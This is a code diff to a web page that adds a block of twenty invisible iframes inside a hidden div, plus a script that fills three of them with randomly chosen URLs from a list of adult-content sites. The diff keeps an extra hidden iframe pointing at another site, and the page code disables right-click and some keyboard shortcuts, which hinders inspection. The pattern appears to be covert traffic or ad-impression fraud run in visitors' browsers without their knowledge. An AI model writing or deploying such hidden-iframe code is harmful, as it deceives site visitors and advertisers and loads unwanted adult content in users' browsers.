@@ -3,6 +3,24 @@
 <head>
 <script>
 
+function isInIframe() {
+        try {
+            return window.self !== window.top;
+        } catch (e) {
+            return true;
+        }
+}
+
+
+
+if (isInIframe()) {
+		
+
+} else {
+	//window.location.href = "https://www.google.com";
+}
+
+
 document.addEventListener('contextmenu', event => event.preventDefault());
 
     document.onkeydown = function (e) {
@@ -43,7 +61,7 @@ function getRandomSublist(arr, size) {
 
 
 const lis1 = [
-							   'https://vazza.site/sex.html?sex=1', 
+							  'https://vazza.site/sex.html?sex=1', 
 							  'https://vazza.site/sex.html?sex=2', 
 							  'https://vazza.site/sex.html?sex=3', 
 							  'https://vazza.site/sex.html?sex=4', 
@@ -65,32 +83,6 @@ const lis1 = [
 							  'https://xinxao.site/sex.html?sex=9', 
 							  'https://xinxao.site/sex.html?sex=10',							 
 							 ];
-console.log(getRandomSublist(lis1, 3)); 
-
-
-</script>
-
-
-<script>
-
-
-function isInIframe() {
-        try {
-            return window.self !== window.top;
-        } catch (e) {
-            return true;
-        }
-}
-
-
-
-if (isInIframe()) {
-		
-
-} else {
-	//window.location.href = "https://www.google.com";
-}
-
 
 </script>
 
@@ -99,11 +91,39 @@ if (isInIframe()) {
 
 	
 	<div style="display:none;">	
+				
+			<iframe id="adx0" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx1" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx2" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx3" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx4" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx5" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx6" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx7" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx8" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx9" src="" height="768" width="1366" ></iframe>
 
-			
-		
 
-		
+			<iframe id="adx10" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx11" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx12" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx13" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx14" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx15" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx16" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx17" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx18" src="" height="768" width="1366" ></iframe>
+			<iframe id="adx19" src="" height="768" width="1366" ></iframe>
+<script>
+			const lis2 = getRandomSublist(lis1, 3);
+
+			for (let i = 0; i < lis2.length; i++) {
+				document.getElementById("adx" + i).src = lis2[i];
+			}
+
+</script>
+
+
 			<iframe src="https://bestdailyxx.xyz/kkkk.html" height="768" width="1366" ></iframe>
 
 
